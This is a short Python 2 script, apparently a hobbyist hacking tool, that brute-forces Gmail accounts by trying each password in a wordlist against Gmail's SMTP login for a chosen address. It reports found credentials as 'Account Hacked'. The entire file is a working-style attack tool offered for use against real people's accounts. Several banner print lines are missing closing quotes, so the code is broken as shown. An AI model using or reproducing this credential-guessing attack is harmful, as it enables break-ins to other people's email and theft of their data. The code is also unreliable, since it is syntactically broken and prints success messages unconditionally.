#coding: utf-8
import smtplib
import sys

server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()

print "-----------------------------------------------------------------------------------------"
print "                      -------------   ----      ----      -------------
print "                      --               -- =      --       --
print "                      --               ==   =    ==       == 
print "                      ============     ==     =  ==       =============
print "  [+] Coded By Pablo Santhus "
print "  [+] Brute Force Gmail 2016 "
print "  [+] Plataforma: Python "
print "  [+] Help: python gmail.py exemplo@gmail.com wordlist"
print "  [*] Email: " + sys.argv[1]
print "----------------------------------------------------------------------------------------------"

user 		= sys.argv[1]
wordlist 	= open(sys.argv[2], "r")

print " [*] Conectando com o Gmail Server... "
print " [*] Conexao estabelecida com o servidor..."
print " [*] Voce foi conectado com sucesso..."
print " [*] Ataque iniciado, Aguarde..."
print ""
print ""

for brute in wordlist:
	try:
		server.login(user, brute)
		print "----------------------------------------------------------------------------------"
		print ""
		print("[+] Account Hacked: %s") % "Email: " + user + " Senha: " + brute
		print "----------------------------------------------------------------------------------"
		break
	except:
		print("[-] Account NOT Hacked: %s") % brute 
